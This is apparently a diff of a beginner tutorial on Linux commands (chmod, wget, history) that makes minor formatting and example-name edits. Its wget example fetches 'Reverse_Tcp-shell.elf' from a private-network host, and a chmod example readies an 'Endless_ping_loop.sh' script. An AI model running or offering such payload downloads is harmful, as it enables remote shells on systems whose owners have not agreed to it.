@@ -119,8 +119,8 @@ Display a file with a dash in the name with (./)
 **e. chmod** <br>
 Change mode allows you to change file mode bits. In **.nix** environments, file and folder permissions are displayed with the ls command, beginning with: Directory/Link: 1 bit, followed by: user/group/owner with 3 bits each: (-DUUUGGGOOO) The: + operator adds selected file mode bits, and: - removes them. So to give the current user and group execute permissions on a file try this:
 <pre>$ chmod ug+x Endless_ping_loop.sh</pre>
-<pre>$ ./file_name.ext</pre>
-Execute the file with (./)
+<pre>$ ./Endless_ping_loop.sh</pre>
+Execute the file with (./)<br>
 **f. wget**<br>
 This neat tool is known as the non-interactive network downloader. And it does just that, this command downloads a file from a remote server.
 <pre>$ wget http://192.168.53.4/files/Reverse_Tcp-shell.elf </pre>
@@ -133,10 +133,10 @@ Make a hexdump or do the reverse. This simple command uses -r: reverse, to conve
 **i. history**<br>
 This simple command shows a numbered list of the previous commands you have entered since you last erased your Bash history.
 <pre>$ history</pre>
-<pre>1 ls -al
-  2 cd ../our/parents/child/dir
-  3 whoami
-  4 echo hello > foo.bar</pre>
+<pre>1 ls -ali
+2 cd ../our/parents/child/dir
+3 whoami
+4 echo hello > foo.bar</pre>
 If you want to run any previous command, just use: !#number
 <pre>$ !3
 $ root</pre>
